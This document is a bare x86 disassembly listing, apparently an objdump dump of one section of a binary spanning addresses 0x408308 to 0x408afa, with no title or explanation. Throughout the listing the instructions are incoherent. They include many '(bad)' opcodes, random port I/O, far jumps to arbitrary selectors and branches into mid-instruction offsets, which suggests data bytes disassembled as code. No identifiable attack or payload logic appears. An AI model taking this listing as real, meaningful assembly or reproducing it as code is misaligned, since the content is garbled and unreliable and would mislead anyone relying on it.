  408308:	lods   al,BYTE PTR ds:[esi]
  408309:	jge    0x4082a8
  40830b:	icebp  
  40830c:	inc    ebp
  40830d:	(bad)  
  40830e:	adc    bh,BYTE PTR [ebx]
  408310:	jp     0x408357
  408312:	adc    al,0x66
  408314:	data16 ficom DWORD PTR [edx+0x38]
  408318:	jnp    0x4082bf
  40831a:	dec    ebx
  40831b:	push   ecx
  40831c:	fwait
  40831d:	nop
  40831e:	jo     0x408303
  408320:	push   ss
  408321:	dec    ebx
  408322:	xchg   eax,ebx
  408324:	push   cs
  408325:	mov    ds:0x5ec02781,eax
  40832a:	add    BYTE PTR [eax],al
  40832c:	retf   
  40832d:	xchg   esi,eax
  40832e:	push   eax
  40832f:	jno    0x408356
  408331:	js     0x4082d4
  408333:	jp     0x408312
  408335:	out    dx,al
  408336:	mul    eax
  408338:	out    0xff,eax
  40833a:	bound  ebx,QWORD PTR [ebx-0x7d74e6b6]
  408340:	(bad)  
  408341:	stos   DWORD PTR es:[edi],eax
  408342:	lds    esi,FWORD PTR [ebp+edi*4-0x7362ee3a]
  408349:	cmp    eax,0xff1d0000
  40834e:	xor    edx,DWORD PTR [ecx+0x1a2ed39]
  408354:	mov    bh,0x2c
  408356:	xchg   edi,eax
  408357:	int3   
  408358:	push   cs
  408359:	add    BYTE PTR [eax],al
  40835b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40835c:	cld    
  40835d:	arpl   bp,bp
  40835f:	std    
  408360:	push   ecx
  408361:	mov    ch,0xc
  408363:	mov    eax,0xd85f0000
  408368:	pop    es
  408369:	jle    0x4083ab
  40836b:	or     eax,DWORD PTR [eax]
  40836d:	add    BYTE PTR [esi-0x43],dh
  408370:	aad    0x63
  408372:	mov    ds:0x9d20b9d8,al
  408377:	imul   esp,DWORD PTR [ecx],0xffffffba
  40837a:	sbb    edi,DWORD PTR [ecx+0x1b]
  40837d:	mov    edi,0x40a1f79d
  408382:	cmp    BYTE PTR [eax],al
  408384:	add    BYTE PTR [edx+0x78],bl
  408387:	aas    
  408388:	sbb    DWORD PTR [ebx],ebp
  40838a:	rol    BYTE PTR [ecx+0x530f3385],1
  408390:	into   
  408391:	and    DWORD PTR [edx-0x45],edi
  408394:	pop    edx
  408395:	sub    eax,DWORD PTR [ebp-0x23fabe10]
  40839b:	shl    DWORD PTR [esi+0x275a5bd8],0x5a
  4083a2:	test   DWORD PTR [ecx],esi
  4083a4:	in     eax,dx
  4083a5:	push   edi
  4083a6:	rol    ebx,1
  4083a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083a9:	xor    DWORD PTR [esi-0xd],ecx
  4083ac:	mov    bl,0x49
  4083ae:	adc    edi,esp
  4083b0:	mov    al,ds:0x142c977b
  4083b5:	jne    0x408418
  4083b7:	(bad)  
  4083b8:	ja     0x408364
  4083ba:	mov    bh,0xdc
  4083bc:	xchg   ebx,eax
  4083bd:	std    
  4083be:	jge    0x40840c
  4083c0:	add    eax,0x12f30000
  4083c5:	retf   0x68c1
  4083c8:	out    0xdb,al
  4083ca:	or     DWORD PTR [esi+0x8a8c4d],esi
  4083d0:	add    BYTE PTR [ebx],dh
  4083d2:	jl     0x4083bf
  4083d4:	mov    bl,0xf4
  4083d6:	jl     0x4083e1
  4083d8:	ds xchg ecx,eax
  4083da:	jns    0x408455
  4083dc:	mov    eax,0x60c14d75
  4083e1:	fwait
  4083e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4083e3:	adc    eax,0x61ae29ee
  4083e8:	mov    bh,0x60
  4083ea:	test   bh,al
  4083ec:	add    BYTE PTR [eax],al
  4083ee:	stc    
  4083ef:	shr    BYTE PTR [esi],0x0
  4083f2:	add    BYTE PTR [ebp+0x2a349818],cl
  4083f8:	fsubr  QWORD PTR [ecx]
  4083fa:	mov    esp,DWORD PTR [edi+eiz*1+0x71]
  4083fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083ff:	mov    cl,0x23
  408401:	cmc    
  408402:	jns    0x408478
  408404:	add    BYTE PTR [eax+eax*1],dh
  408407:	add    BYTE PTR [ebp+0xb6086c],ah
  40840d:	add    BYTE PTR [edx+0xafcc],ah
  408413:	icebp  
  408414:	cld    
  408415:	sub    BYTE PTR [esi-0x4d],dh
  408418:	adc    ah,dh
  40841a:	fsub   DWORD PTR [eax]
  40841c:	jns    0x4083b1
  40841e:	enter  0x73,0x0
  408422:	cmovg  ebx,DWORD PTR [eax-0x63f06a3a]
  408429:	inc    ebp
  40842a:	adc    dl,BYTE PTR [esi]
  40842c:	add    BYTE PTR [ebx],ah
  40842e:	add    BYTE PTR [eax],al
  408430:	lods   eax,DWORD PTR ds:[esi]
  408431:	(bad)  
  408432:	and    eax,0x63d2240d
  408437:	xor    DWORD PTR [ebx+0x4e],ebp
  40843a:	sbb    eax,DWORD PTR [edx+0x31]
  40843d:	jae    0x408429
  40843f:	lock jo 0x408407
  408442:	or     DWORD PTR [ecx+0x1f6534d8],eax
  408448:	xchg   esi,eax
  408449:	pop    esp
  40844a:	sub    esp,DWORD PTR [edx+0x30]
  40844d:	lock mov edx,0xd084
  408453:	add    al,0xeb
  408455:	add    BYTE PTR [eax],al
  408457:	pop    ebp
  408458:	push   ebx
  408459:	dec    eax
  40845a:	adc    eax,0x3c840000
  40845f:	add    BYTE PTR [eax],al
  408461:	mov    bh,0x4a
  408463:	rcr    BYTE PTR [eax],1
  408465:	sbb    eax,0x5b2fbc52
  40846a:	fisub  DWORD PTR [edi]
  40846c:	mov    bl,0x8a
  40846e:	mov    edx,0xd7d1058d
  408473:	call   0xe5e68779
  408478:	dec    esi
  408479:	les    edx,FWORD PTR [ebp+0x3c3a0000]
  40847f:	(bad)  
  408480:	or     ebx,edi
  408482:	fcomp  st(4)
  408484:	rol    edx,1
  408486:	jmp    0x40845e
  408488:	sub    ah,0x0
  40848b:	add    cl,cl
  40848d:	sub    al,0x34
  40848f:	cmp    ch,BYTE PTR [esi+0x3ac370a6]
  408495:	xchg   edx,eax
  408496:	in     al,dx
  408497:	scas   eax,DWORD PTR es:[edi]
  408498:	add    eax,0x8cf1ec09
  40849d:	jge    0x40849f
  40849f:	add    BYTE PTR [ebx-0x2c],bl
  4084a2:	stos   BYTE PTR es:[edi],al
  4084a3:	xor    bh,BYTE PTR [edi]
  4084a5:	mov    bl,0x3d
  4084a7:	mov    eax,0x3224f5bb
  4084ac:	call   0xce8f:0xdf15326a
  4084b3:	mov    cl,0x92
  4084b5:	cwde   
  4084b6:	sbb    al,0x2f
  4084b8:	cmp    edi,ebp
  4084ba:	loop   0x4084bb
  4084bc:	xlat   BYTE PTR ds:[ebx]
  4084bd:	add    BYTE PTR [ebp+0xc1d0000],ah
  4084c3:	lods   eax,DWORD PTR ds:[esi]
  4084c4:	add    BYTE PTR [eax],al
  4084c6:	xstore-rng (bad)
  4084c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4084c8:	add    dl,bh
  4084ca:	out    0x6,eax
  4084cc:	mov    bl,0xd8
  4084ce:	or     edi,edi
  4084d0:	mov    al,ds:0xf0e17474
  4084d5:	xchg   esp,eax
  4084d6:	imul   esp,eax,0x13313720
  4084dc:	mov    esi,0x9e0f0e30
  4084e1:	xchg   DWORD PTR [esi+0xf877d6d],edx
  4084e7:	sub    DWORD PTR [esi-0x28],0x5e2aa803
  4084ee:	xchg   DWORD PTR [ecx-0x29],edx
  4084f1:	mov    ss,WORD PTR [ebp+0x25ecc71f]
  4084f7:	shr    DWORD PTR [ecx-0x29],1
  4084fa:	ins    BYTE PTR es:[edi],dx
  4084fb:	into   
  4084fc:	shl    DWORD PTR [ebx*8+0x57338b29],cl
  408503:	je     0x408566
  408505:	fdiv   st,st(4)
  408507:	jl     0x4084c4
  408509:	xor    bl,BYTE PTR [ebp-0x7c]
  40850c:	out    0x0,al
  40850e:	add    BYTE PTR [ecx],cl
  408510:	push   ds
  408511:	inc    ecx
  408513:	and    al,0x39
  408515:	mov    cl,0xfd
  408517:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408518:	popa   
  408519:	sub    BYTE PTR [edi],dh
  40851b:	mov    ?,WORD PTR ds:0x94636cc5
  408521:	rcr    DWORD PTR [esi+0x664c5941],0x0
  408528:	add    ah,dl
  40852a:	fimul  DWORD PTR [ecx+eiz*2+0x0]
  40852e:	add    BYTE PTR [ebp+0xbd847a],dh
  408534:	add    ah,ch
  408536:	cmp    dl,al
  408538:	shl    ebx,0xaa
  40853b:	jp     0x4084da
  40853d:	push   edx
  40853e:	xchg   ecx,eax
  40853f:	test   eax,0x5d4bd77e
  408544:	push   ss
  408545:	retf   0x5029
  408548:	jmp    0x7418c2ec
  40854d:	adc    edx,ecx
  40854f:	lock xor ebx,esi
  408552:	pop    edx
  408553:	push   ds
  408554:	int3   
  408555:	nop
  408556:	add    BYTE PTR [eax],al
  408558:	sub    eax,0x98fc3e47
  40855d:	pop    ss
  40855e:	mov    ds:0x660fe4f9,eax
  408563:	mov    ecx,0x5478c76d
  408568:	mov    edx,0xa006466a
  40856d:	pop    esi
  40856e:	adc    edi,DWORD PTR [ecx-0x15d76763]
  408574:	(bad)  
  408575:	jns    0x40855d
  408577:	add    esp,DWORD PTR [ebx+0x4d]
  40857a:	outs   dx,BYTE PTR ds:[esi]
  40857b:	inc    ebx
  40857c:	mov    edi,0xeda6fd2d
  408581:	call   FWORD PTR [ebx+0xc5c559e]
  408587:	add    eax,DWORD PTR [eax]
  408589:	add    BYTE PTR [esi],dh
  40858b:	loop   0x4085a2
  40858d:	out    dx,eax
  40858e:	addr16 push esp
  408590:	neg    al
  408592:	leave  
  408593:	jb     0x408606
  408595:	fisubr WORD PTR [esi+0x55]
  408598:	xchg   ebx,eax
  408599:	dec    edi
  40859a:	mov    ebx,0xe01f78a1
  40859f:	xor    ah,BYTE PTR [edi+0xa644]
  4085a5:	adc    DWORD PTR [esi+0x69],0x19
  4085a9:	es std 
  4085ab:	xor    esi,ecx
  4085ad:	inc    esp
  4085ae:	mov    al,0x0
  4085b0:	add    BYTE PTR [esi],bh
  4085b2:	adc    bh,BYTE PTR [edi+ebx*1]
  4085b5:	mov    WORD PTR [ebx],ds
  4085b7:	add    BYTE PTR [eax],al
  4085b9:	mov    edi,0x6b0c
  4085be:	inc    eax
  4085bf:	add    BYTE PTR [eax],0x0
  4085c2:	arpl   WORD PTR [ecx],sp
  4085c4:	ficom  WORD PTR [edx-0x24]
  4085c7:	pop    ss
  4085c8:	test   DWORD PTR [ecx],0xd10f59ea
  4085ce:	pop    edi
  4085cf:	jb     0x4085b9
  4085d1:	dec    esi
  4085d2:	(bad)  
  4085d3:	and    bl,BYTE PTR [eax-0x17]
  4085d6:	gs call 0xf800:0x45c0b1
  4085de:	cld    
  4085df:	adc    ah,ch
  4085e1:	inc    esp
  4085e2:	outs   dx,DWORD PTR ds:[esi]
  4085e3:	add    BYTE PTR [eax],al
  4085e5:	mov    bl,0x2
  4085e7:	das    
  4085e8:	retf   0x775b
  4085eb:	out    dx,al
  4085ec:	in     eax,0x95
  4085ee:	in     al,dx
  4085ef:	cld    
  4085f0:	es jle 0x4085eb
  4085f3:	jmp    0x4085bc
  4085f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085f6:	xchg   edi,eax
  4085f7:	xchg   DWORD PTR [ebp-0x2be11bd5],esi
  4085fd:	jno    0x4085c9
  4085ff:	cmp    eax,0x7216cf19
  408604:	inc    esp
  408605:	dec    eax
  408606:	add    BYTE PTR [eax],al
  408608:	adc    esp,ebx
  40860a:	ja     0x408678
  40860c:	ret    
  40860d:	add    DWORD PTR [ebx-0xff6f283],ecx
  408613:	aad    0x38
  408615:	(bad)  
  408616:	xchg   ah,ch
  408618:	push   edx
  408619:	dec    esp
  40861a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40861b:	add    BYTE PTR [eax],al
  40861d:	inc    edx
  40861e:	mov    ebp,0xea05459c
  408623:	pusha  
  408624:	mov    eax,0x9df197a3
  408629:	lods   eax,DWORD PTR ds:[esi]
  40862a:	jo     0x408671
  40862c:	sbb    BYTE PTR [edx+ecx*4-0x77],bl
  408630:	mov    edx,0x18fec94f
  408635:	xchg   edi,eax
  408636:	push   esi
  408637:	jnp    0x40862f
  408639:	aam    0xdd
  40863b:	jnp    0x4086a6
  40863d:	aas    
  40863e:	xchg   ebx,eax
  40863f:	fimul  WORD PTR [esp+ebx*8-0x53340000]
  408646:	add    BYTE PTR [eax],al
  408648:	fidivr WORD PTR [ebx-0x62]
  40864b:	outs   dx,BYTE PTR ds:[esi]
  40864c:	add    BYTE PTR [bx+0x0],bh
  408651:	jl     0x4085dc
  408653:	cmovl  ebx,DWORD PTR [ebx-0x2d20000]
  40865a:	loopne 0x40862c
  40865c:	mov    bh,0x99
  40865e:	jg     0x408625
  408660:	cmp    BYTE PTR [eax+eax*1+0x0],0x67
  408665:	retf   0xd507
  408668:	test   eax,0x85552dd9
  40866d:	sbb    al,0xb
  40866f:	arpl   WORD PTR [eax-0x20],ax
  408672:	add    BYTE PTR [eax],al
  408674:	jle    0x408692
  408676:	jp     0x4086d9
  408678:	dec    edx
  408679:	inc    edx
  40867a:	jge    0x408694
  40867c:	inc    eax
  40867d:	mov    eax,ds:0x2f7f0000
  408682:	add    BYTE PTR [ecx],cl
  408684:	add    BYTE PTR [eax],al
  408686:	daa    
  408687:	adc    BYTE PTR [edx+esi*1+0x7647201f],bl
  40868e:	jnp    0x4086c9
  408690:	cmp    BYTE PTR [edi+0x2a0aa846],cl
  408696:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408697:	pop    esp
  408698:	mov    ah,0xa4
  40869a:	sub    BYTE PTR ds:0x44643bf9,ah
  4086a0:	sub    BYTE PTR [eax],al
  4086a2:	add    BYTE PTR [eax-0x48],bh
  4086a5:	daa    
  4086a6:	sub    al,0x27
  4086a8:	adc    bh,dl
  4086aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4086ab:	sahf   
  4086ac:	mov    ah,0x1b
  4086ae:	sbb    al,0x62
  4086b0:	inc    esi
  4086b1:	repnz (bad) 
  4086b3:	mov    bl,0xd2
  4086b5:	mov    ch,0x41
  4086b7:	pop    edi
  4086b8:	jns    0x408674
  4086ba:	fadd   st,st(1)
  4086bc:	xor    BYTE PTR ds:0x404d8,dl
  4086c2:	add    dl,bh
  4086c4:	(bad)  
  4086c5:	into   
  4086c6:	dec    esp
  4086c7:	rol    DWORD PTR [eax],cl
  4086c9:	add    bh,dl
  4086cb:	cmp    DWORD PTR [edi],eax
  4086cd:	dec    ecx
  4086ce:	xor    esp,eax
  4086d0:	shr    DWORD PTR [ebx],cl
  4086d2:	daa    
  4086d3:	push   edx
  4086d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086d5:	aam    0x4b
  4086d7:	jmp    0xcfdf:0x94098eb4
  4086de:	xlat   BYTE PTR ds:[ebx]
  4086df:	les    ebx,FWORD PTR [ecx+0x0]
  4086e2:	add    bl,ch
  4086e4:	dec    edi
  4086e5:	cli    
  4086e6:	adc    eax,0x84a12a77
  4086eb:	add    BYTE PTR fs:[eax],al
  4086ee:	xor    esp,DWORD PTR [edx-0x5d26b876]
  4086f4:	cmp    DWORD PTR [eax],eax
  4086f6:	cmp    al,0x0
  4086f8:	add    BYTE PTR [esi+0xfa4c],al
  4086fe:	lahf   
  4086ff:	dec    edi
  408700:	mov    BYTE PTR [esi-0xf210000],dl
  408706:	idiv   DWORD PTR ds:0x2cc
  40870c:	mov    ds:0x426e3bd4,al
  408711:	aad    0xf4
  408713:	mov    eax,0xbe83212
  408718:	js     0x408719
  40871a:	jecxz  0x408718
  40871c:	ret    0x5f92
  40871f:	sub    BYTE PTR [esi-0x71],dl
  408722:	(bad)  
  408723:	fist   DWORD PTR [ebp+0x7]
  408726:	sbb    dh,ah
  408728:	fisttp QWORD PTR [ebp-0x59]
  40872b:	add    bh,BYTE PTR [ebx-0x2d]
  40872e:	dec    ebp
  408730:	xchg   BYTE PTR [edi+ecx*2],cl
  408733:	add    BYTE PTR [eax],al
  408735:	in     al,0x37
  408737:	out    0x2b,eax
  408739:	jg     0x40870b
  40873b:	fist   WORD PTR [edi]
  40873d:	mov    ah,0xe8
  40873f:	sub    DWORD PTR [ebp+0x32],0x3a4bac01
  408746:	jmp    0x113e172
  40874b:	imul   eax,DWORD PTR [eax],0x0
  40874e:	fist   WORD PTR [edi+edx*2]
  408751:	xchg   ebp,eax
  408752:	in     al,0x34
  408754:	push   0x1
  408756:	pushf  
  408757:	(bad)  
  408758:	mov    cl,0x93
  40875a:	lahf   
  40875b:	ja     0x40873d
  40875d:	inc    eax
  40875e:	add    DWORD PTR [eax],0x0
  408761:	and    DWORD PTR [eax-0x61a44abe],esi
  408767:	mov    eax,0x43139be8
  40876c:	inc    esi
  40876d:	xor    bh,BYTE PTR [esi+0x30c42987]
  408773:	add    BYTE PTR [eax],al
  408775:	fmul   QWORD PTR [eax]
  408777:	add    BYTE PTR fs:[eax],al
  40877a:	inc    edi
  40877b:	cmovne eax,DWORD PTR [ecx+edx*2]
  40877f:	add    BYTE PTR [eax],al
  408781:	fstp   QWORD PTR [edx+0x6f]
  408784:	or     DWORD PTR [edx+esi*1-0x443aaaf5],edi
  40878b:	retf   
  40878c:	mov    eax,0xf089919c
  408791:	jmp    0x649bc135
  408796:	xchg   esp,eax
  408797:	bts    DWORD PTR [esi],ebx
  40879a:	sub    eax,0xeb345e82
  40879f:	sbb    esi,DWORD PTR es:[edi]
  4087a2:	rol    ebp,cl
  4087a4:	(bad)  
  4087a6:	xchg   DWORD PTR [esi+ebp*8-0x1e],ebp
  4087aa:	jno    0x4087d3
  4087ac:	or     al,0xfa
  4087ae:	add    BYTE PTR [eax],al
  4087b0:	stc    
  4087b1:	ins    DWORD PTR es:[edi],dx
  4087b2:	inc    ebx
  4087b3:	and    dh,BYTE PTR [edx]
  4087b5:	pop    edx
  4087b6:	push   esi
  4087b7:	sbb    eax,0xc6cc3f
  4087bc:	add    BYTE PTR [edx-0x694eabe6],dl
  4087c2:	sub    al,0xb2
  4087c4:	dec    eax
  4087c5:	inc    DWORD PTR [eax]
  4087c7:	add    bl,bh
  4087c9:	repz jl 0x408798
  4087cc:	pop    ds
  4087cd:	add    BYTE PTR [eax],al
  4087cf:	js     0x40884d
  4087d1:	loope  0x408791
  4087d3:	icebp  
  4087d4:	mov    ds:0x8704524e,al
  4087d9:	add    BYTE PTR [eax],al
  4087db:	or     DWORD PTR [edx+0x18],ebp
  4087de:	add    al,0xcc
  4087e0:	add    BYTE PTR [eax],al
  4087e2:	push   ecx
  4087e3:	mov    cl,0xa7
  4087e5:	pop    ebx
  4087e6:	enter  0x3a,0x0
  4087ea:	popa   
  4087eb:	jp     0x408798
  4087ed:	out    dx,eax
  4087ee:	mov    eax,0xd3034fe9
  4087f3:	adc    eax,edi
  4087f5:	fcomi  st,st(3)
  4087f7:	adc    eax,0x39007dab
  4087fc:	add    BYTE PTR [eax],al
  4087fe:	pop    ebp
  4087ff:	push   edx
  408800:	jge    0x408862
  408802:	sbb    DWORD PTR [ebp-0x70],edi
  408805:	fwait
  408806:	adc    esp,DWORD PTR [edx-0x23b69662]
  40880c:	cvtps2pi mm2,QWORD PTR [edi-0x69]
  408810:	repnz mov ds:0xe4aa45e9,eax
  408816:	jmp    0x4087f4
  408818:	add    BYTE PTR [eax+eax*1+0x0],al
  40881c:	popf   
  40881d:	mov    ds:0xbbd5b956,al
  408822:	xchg   esi,eax
  408823:	fiadd  DWORD PTR [ecx]
  408825:	cli    
  408826:	pop    eax
  408827:	push   edi
  408828:	mov    es,WORD PTR [edx+ecx*2]
  40882b:	add    BYTE PTR [eax],al
  40882d:	(bad)  
  40882e:	aas    
  40882f:	sbb    dl,al
  408831:	cmp    dh,BYTE PTR [ebx-0x37c59d07]
  408837:	inc    edi
  408838:	add    BYTE PTR [eax],al
  40883a:	mov    bl,0xaa
  40883c:	inc    edi
  40883d:	rcl    BYTE PTR [ebx-0x10],1
  408840:	and    ch,bl
  408842:	jnp    0x40884a
  408844:	cmp    DWORD PTR [edx+0x79],eax
  408847:	inc    esi
  408848:	aam    0x2f
  40884a:	pop    ebp
  40884b:	ror    DWORD PTR [ebp+ebx*8-0x6e5d0000],0x35
  408853:	je     0x4087f7
  408855:	sahf   
  408856:	push   0x151dded4
  40885b:	cwde   
  40885c:	mov    esp,0xd742825e
  408861:	push   esi
  408862:	fisubr DWORD PTR cs:[esi-0x14c7c3ff]
  408869:	cdq    
  40886a:	sbb    al,BYTE PTR [ecx+0x1b949b28]
  408870:	adc    eax,0xa42a5b83
  408875:	int    0x1c
  408877:	push   cs
  408878:	shl    DWORD PTR [ecx+esi*2-0x52],1
  40887c:	push   esp
  40887d:	gs (bad) 
  40887f:	repz mov ebx,0xfec65041
  408885:	cwde   
  408886:	fs int3 
  408888:	test   DWORD PTR [eax],0x2d590500
  40888e:	jle    0x40890b
  408890:	lds    eax,FWORD PTR [ecx+0x113ca4d2]
  408896:	jnp    0x408876
  408898:	cmp    eax,0x713172da
  40889d:	fs sbb eax,0x3c1fb2e7
  4088a3:	push   edx
  4088a4:	cmp    esi,DWORD PTR [ebp-0x487cb9d1]
  4088aa:	faddp  st(0),st
  4088ac:	push   ebx
  4088ad:	add    BYTE PTR [eax],al
  4088af:	push   esi
  4088b0:	push   cs
  4088b1:	jae    0x40890e
  4088b3:	ret    0x37dc
  4088b6:	repnz div esp
  4088b9:	(bad)  
  4088ba:	push   ebx
  4088bb:	cmp    dh,BYTE PTR [eax-0x3fdd3c72]
  4088c1:	and    eax,0x5a330000
  4088c6:	sbb    DWORD PTR [ebx-0x3b],0x11
  4088ca:	sbb    ecx,DWORD PTR [esi+edx*2+0x12250000]
  4088d1:	popf   
  4088d2:	or     al,0x69
  4088d4:	add    BYTE PTR [eax],al
  4088d6:	jmp    0x7534ab48
  4088db:	lock cmc 
  4088dd:	int    0xc4
  4088df:	push   ebx
  4088e0:	add    BYTE PTR [eax],al
  4088e2:	sbb    dh,BYTE PTR [edi+edx*1-0x16]
  4088e6:	inc    edi
  4088e7:	cmp    ebp,DWORD PTR [esi-0x124bafa5]
  4088ed:	daa    
  4088ee:	push   0xffffffcb
  4088f0:	and    DWORD PTR [eax],ebp
  4088f2:	ins    BYTE PTR es:[edi],dx
  4088f3:	xor    eax,0x38a53e6e
  4088f8:	hlt    
  4088f9:	jle    0x408921
  4088fb:	movq   mm0,QWORD PTR [ecx+eiz*4-0x41c40000]
  408903:	(bad)  
  408904:	cmp    eax,0xaf1b11de
  408909:	cmp    DWORD PTR ds:0x6448,0x2ce30105
  408913:	mov    al,0x9f
  408915:	inc    edi
  408916:	push   esp
  408917:	sub    bl,bh
  408919:	mov    ecx,0x1e29411e
  40891e:	jmp    0x8:0x443456bc
  408925:	add    BYTE PTR [edx+edx*4+0x980095],ch
  40892c:	add    BYTE PTR [ecx],ah
  40892e:	inc    edx
  40892f:	sti    
  408930:	div    BYTE PTR [ebx]
  408932:	inc    edx
  408933:	or     eax,0x323d0173
  408938:	cld    
  408939:	(bad)  
  40893a:	es add eax,0x89631693
  408940:	retf   
  408941:	push   0x32
  408943:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408944:	cmp    esi,ebp
  408946:	neg    BYTE PTR [ebx+0x58]
  408949:	xor    esi,ebp
  40894b:	push   cs
  40894c:	rcl    BYTE PTR [eax+0x7c580000],0xd8
  408953:	fstp   QWORD PTR [ecx+0x6836f62f]
  408959:	inc    ebx
  40895a:	mov    eax,0x12e1b27f
  40895f:	pop    esp
  408960:	add    eax,DWORD PTR [ebx+0xe54c1a]
  408966:	add    BYTE PTR [esi+0x7a],ch
  408969:	test   al,0x9d
  40896b:	adc    dl,ch
  40896d:	and    BYTE PTR [edi-0x7],cl
  408970:	hlt    
  408971:	rcl    BYTE PTR [ebx],1
  408973:	in     al,0x7e
  408975:	rol    DWORD PTR [edi-0x3c556b8d],1
  40897b:	mov    edx,0x4b254fd
  408980:	mov    edi,0x251d0000
  408985:	scas   al,BYTE PTR es:[edi]
  408986:	xchg   esp,eax
  408987:	(bad)  
  408989:	xor    al,0x21
  40898b:	das    
  40898c:	xchg   esi,eax
  40898d:	push   esi
  40898e:	jne    0x4089fb
  408990:	sbb    eax,0xb64525c6
  408995:	hlt    
  408996:	imul   edx,DWORD PTR [esi+0x1d],0xffffffc7
  40899a:	pop    edx
  40899b:	cs xor cl,0x93
  40899f:	jno    0x4089f2
  4089a1:	pop    ds
  4089a2:	addr16 nop
  4089a4:	lods   al,BYTE PTR ds:[esi]
  4089a5:	xor    BYTE PTR [edx-0xdcc7c79],bl
  4089ab:	aad    0xf2
  4089ad:	mov    edx,0x2b116f01
  4089b2:	outs   dx,DWORD PTR ds:[esi]
  4089b3:	push   0x1f040642
  4089b8:	add    BYTE PTR [eax],al
  4089ba:	xchg   ecx,eax
  4089bb:	jge    0x4089d1
  4089bd:	xor    cl,BYTE PTR [ebp+0x27]
  4089c0:	mov    ebx,DWORD PTR [edi]
  4089c2:	adc    al,0xfc
  4089c4:	cdq    
  4089c5:	test   DWORD PTR [ebx+0x3a],esp
  4089c8:	fincstp 
  4089ca:	fidiv  DWORD PTR [ebx+0x37731332]
  4089d0:	mov    ds:0xd598c342,al
  4089d5:	cmc    
  4089d6:	ja     0x40899f
  4089d8:	xor    BYTE PTR [ecx+0x1ad86dd4],al
  4089de:	addr16 cmp eax,0xe28286ce
  4089e4:	enter  0x4a,0x0
  4089e8:	stos   BYTE PTR es:[edi],al
  4089e9:	cmp    BYTE PTR [eax-0x27cdc0a4],dh
  4089ef:	popf   
  4089f0:	add    al,0xc8
  4089f2:	add    BYTE PTR [eax],al
  4089f4:	sbb    BYTE PTR [ebp+0x150c0fe7],dl
  4089fa:	add    BYTE PTR [eax],al
  4089fc:	xor    ebp,ecx
  4089fe:	loop   0x408998
  408a00:	push   ebx
  408a01:	sbb    DWORD PTR [esi],esi
  408a03:	dec    eax
  408a04:	mov    al,ds:0x6a440000
  408a09:	add    BYTE PTR [eax],al
  408a0b:	mov    cl,0xf8
  408a0d:	push   cs
  408a0e:	jns    0x408a82
  408a10:	out    dx,eax
  408a11:	jmp    0x33:0x8ca5e537
  408a18:	add    BYTE PTR [ebp+0x8480],ch
  408a1e:	sbb    DWORD PTR [ecx],esp
  408a20:	ins    BYTE PTR es:[edi],dx
  408a21:	sub    BYTE PTR [eax+0x13],0xac
  408a25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a26:	ins    DWORD PTR es:[edi],dx
  408a27:	cli    
  408a28:	fsubr  DWORD PTR [ebp+ebx*8+0x544e640b]
  408a2f:	jmp    0x9656:0x78feda82
  408a36:	cmp    esi,edx
  408a38:	out    0x87,eax
  408a3a:	xor    al,0xe0
  408a3c:	mov    ah,0xed
  408a3e:	sub    DWORD PTR [ebx-0x2c43830],0x13c76197
  408a48:	and    ebp,DWORD PTR [edx+0xdb84d7]
  408a4e:	add    BYTE PTR [esp+eiz*8-0x6c5c5925],ch
  408a55:	mov    edi,0x66631513
  408a5a:	lds    eax,FWORD PTR [ecx-0x319e4b6e]
  408a60:	inc    BYTE PTR [esi+0x58]
  408a63:	test   DWORD PTR [esi+0x199b2e38],eax
  408a69:	mov    bh,0x85
  408a6b:	or     bl,al
  408a6d:	add    BYTE PTR [eax],al
  408a6f:	sbb    eax,0xf24c
  408a74:	pop    es
  408a75:	js     0x408a98
  408a77:	out    0x92,eax
  408a79:	std    
  408a7a:	sbb    al,0x9
  408a7c:	and    eax,0x63c73120
  408a81:	lahf   
  408a82:	sbb    eax,0xa2dd9190
  408a87:	xchg   esp,eax
  408a88:	repnz int 0x73
  408a8b:	add    DWORD PTR [eax+0x5b6e06a6],ebx
  408a91:	lods   al,BYTE PTR ss:[esi]
  408a93:	mov    dh,0xca
  408a95:	or     DWORD PTR [ebp+0x3],0x2f708eda
  408a9c:	pop    ss
  408a9d:	or     eax,DWORD PTR [ecx]
  408a9f:	inc    edx
  408aa0:	dec    ebp
  408aa1:	push   ss
  408aa2:	push   edi
  408aa3:	jne    0x408b0a
  408aa5:	xchg   esp,eax
  408aa6:	sub    eax,0x5f4f1837
  408aab:	push   0xffa0d405
  408ab0:	add    DWORD PTR [eax+0x1b],eax
  408ab3:	add    BYTE PTR [eax],al
  408ab5:	data16 (bad) 
  408ab7:	push   cs
  408ab8:	mov    dl,0x89
  408aba:	xlat   BYTE PTR ds:[ebx]
  408abb:	xchg   ebp,eax
  408abc:	pop    es
  408abd:	shl    BYTE PTR [eax+eax*1],0x0
  408ac1:	mov    ecx,0xab72e391
  408ac6:	lahf   
  408ac7:	dec    ebp
  408ac8:	nop
  408ac9:	repz (bad) 
  408acb:	xchg   edi,eax
  408acc:	jb     0x408a72
  408ace:	push   esp
  408acf:	jg     0x408a6c
  408ad1:	add    al,0xa5
  408ad3:	add    BYTE PTR [eax],al
  408ad5:	shr    BYTE PTR [esp+edi*1-0x27],cl
  408ad9:	push   cs
  408ada:	lahf   
  408adb:	clc    
  408adc:	push   esi
  408add:	add    ch,BYTE PTR [ebx]
  408adf:	push   ss
  408ae0:	mov    bh,0xf5
  408ae2:	test   BYTE PTR [ebx],ah
  408ae4:	add    BYTE PTR [eax],al
  408ae6:	mov    bl,0x79
  408ae8:	push   ebp
  408ae9:	sub    DWORD PTR [ecx-0x56de5c90],esp
  408aef:	dec    esi
  408af0:	pushf  
  408af1:	mov    ch,0xaa
  408af3:	mov    dl,0xe3
  408af5:	hlt    
  408af6:	hlt    
  408af7:	or     DWORD PTR cs:[edx],edi
  408afa:	in     al,dx
